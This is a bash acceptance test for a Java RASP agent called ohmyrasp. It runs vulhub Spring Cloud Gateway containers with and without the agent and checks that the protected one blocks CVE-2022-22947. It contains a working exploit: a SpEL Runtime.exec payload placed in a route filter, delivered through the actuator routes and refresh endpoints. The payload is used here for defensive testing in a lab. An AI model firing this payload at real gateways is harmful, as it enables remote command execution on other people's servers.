#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

image="${OHMYRASP_VULHUB_SPRING_GATEWAY_IMAGE:-vulhub/spring-cloud-gateway:3.1.0}"
baseline_name="${OHMYRASP_VULHUB_SPRING_GATEWAY_BASELINE_NAME:-ohmyrasp-vulhub-spring22947-baseline}"
protected_name="${OHMYRASP_VULHUB_SPRING_GATEWAY_PROTECTED_NAME:-ohmyrasp-vulhub-spring22947-protected}"
baseline_port="${OHMYRASP_VULHUB_SPRING_GATEWAY_BASELINE_PORT:-19148}"
protected_port="${OHMYRASP_VULHUB_SPRING_GATEWAY_PROTECTED_PORT:-19149}"
baseline_dir="logs/vulhub-spring-cloud-gateway-3.1.0-java8-baseline"
protected_dir="logs/vulhub-spring-cloud-gateway-3.1.0-java8-protected"
protected_log="${protected_dir}/events.jsonl"
route_id="ohmyrasp22947"
success_file="/tmp/ohmyrasp-spring22947-success"

cleanup() {
  docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
  docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

write_route_payload() {
  local output="$1"
  local marker="$2"
  python3 - "$output" "$marker" <<'PY'
import json
import sys

output = sys.argv[1]
marker = sys.argv[2]
payload = {
    "id": "ohmyrasp22947",
    "filters": [
        {
            "name": "AddResponseHeader",
            "args": {
                "name": "Result",
                "value": (
                    "#{T(java.lang.Runtime).getRuntime().exec("
                    "new String[]{\"sh\",\"-c\",\"id > " + marker + "\"})}"
                ),
            },
        }
    ],
    "uri": "http://example.com",
}
with open(output, "w", encoding="utf-8") as handle:
    json.dump(payload, handle)
PY
}

wait_for_gateway() {
  local name="$1"
  local port="$2"
  local status
  for _ in $(seq 1 180); do
    status="$(curl -sS -o "/tmp/${name}-routes.json" -w "%{http_code}" \
      "http://127.0.0.1:${port}/actuator/gateway/routes" 2>/dev/null || true)"
    if [[ "$status" == "200" ]]; then
      return
    fi
    sleep 1
  done
  docker logs "$name" >&2 || true
  echo "${name} did not expose Spring Cloud Gateway actuator routes at ${port}" >&2
  exit 1
}

expect_protected_startup_without_detection() {
  if ! grep -q '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
    cat "$protected_log" >&2 || true
    echo "missing Java 8 startup event in protected Spring Cloud Gateway container" >&2
    exit 1
  fi
  if ! grep -q '"command_hook":"installed"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "missing Java 8 command hook startup marker in protected Spring Cloud Gateway container" >&2
    exit 1
  fi
  if grep -q '"event":"ohmyrasp-detection"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "protected Spring Cloud Gateway container produced a detection before exploit traffic" >&2
    exit 1
  fi
}

add_route() {
  local port="$1"
  local payload="$2"
  local output="$3"
  curl -sS -o "$output" -w "%{http_code}" \
    -H 'Content-Type: application/json' \
    --data-binary "@${payload}" \
    "http://127.0.0.1:${port}/actuator/gateway/routes/${route_id}" || true
}

refresh_gateway() {
  local port="$1"
  local output="$2"
  curl -sS -o "$output" -w "%{http_code}" \
    -X POST "http://127.0.0.1:${port}/actuator/gateway/refresh" || true
}

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
: > "$protected_log"
chmod 666 "$protected_log"
docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

baseline_payload="${baseline_dir}/route-payload.json"
protected_payload="${protected_dir}/route-payload.json"
write_route_payload "$baseline_payload" "$success_file"
write_route_payload "$protected_payload" "$success_file"

docker run -d --name "$baseline_name" \
  -p "${baseline_port}:8080" \
  "$image" >/dev/null

docker run -d --name "$protected_name" \
  -p "${protected_port}:8080" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  -e "JAVA_TOOL_OPTIONS=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
  "$image" >/dev/null

wait_for_gateway "$baseline_name" "$baseline_port"
wait_for_gateway "$protected_name" "$protected_port"
expect_protected_startup_without_detection

baseline_add_status="$(
  add_route "$baseline_port" "$baseline_payload" "${baseline_dir}/add-route.response"
)"
protected_add_status="$(
  add_route "$protected_port" "$protected_payload" "${protected_dir}/add-route.response"
)"
if [[ "$baseline_add_status" != "201" ]] || [[ "$protected_add_status" != "201" ]]; then
  cat "${baseline_dir}/add-route.response" >&2 || true
  cat "${protected_dir}/add-route.response" >&2 || true
  echo "Spring Cloud Gateway route creation returned unexpected statuses: baseline ${baseline_add_status}, protected ${protected_add_status}" >&2
  exit 1
fi
if grep -q '"event":"ohmyrasp-detection"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "protected Spring Cloud Gateway produced a detection during route registration" >&2
  exit 1
fi

baseline_refresh_status="$(
  refresh_gateway "$baseline_port" "${baseline_dir}/refresh.response"
)"
if [[ ! "$baseline_refresh_status" =~ ^2 ]]; then
  cat "${baseline_dir}/refresh.response" >&2 || true
  echo "baseline Spring Cloud Gateway refresh returned ${baseline_refresh_status}" >&2
  exit 1
fi
if ! docker exec "$baseline_name" sh -c "test -s '${success_file}'"; then
  echo "baseline Spring Cloud Gateway did not create ${success_file}" >&2
  exit 1
fi
docker exec "$baseline_name" cat "$success_file" > "${baseline_dir}/marker.txt"
if ! grep -q 'uid=0(root)' "${baseline_dir}/marker.txt"; then
  cat "${baseline_dir}/marker.txt" >&2
  echo "baseline Spring Cloud Gateway marker did not contain id output" >&2
  exit 1
fi

protected_refresh_status="$(
  refresh_gateway "$protected_port" "${protected_dir}/refresh.response"
)"
if [[ ! "$protected_refresh_status" =~ ^2 ]]; then
  cat "${protected_dir}/refresh.response" >&2 || true
  echo "protected Spring Cloud Gateway refresh returned ${protected_refresh_status}" >&2
  exit 1
fi
if docker exec "$protected_name" sh -c "test -e '${success_file}'"; then
  echo "protected Spring Cloud Gateway created ${success_file} despite Java8 RASP" >&2
  exit 1
fi
if ! grep -q '"algorithm":"java8_command_execution_exploit_primitive".*"action":"block"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "missing java8_command_execution_exploit_primitive block event for Spring Cloud Gateway CVE-2022-22947" >&2
  exit 1
fi

echo "vulhub Spring Cloud Gateway CVE-2022-22947 Java8 acceptance passed"
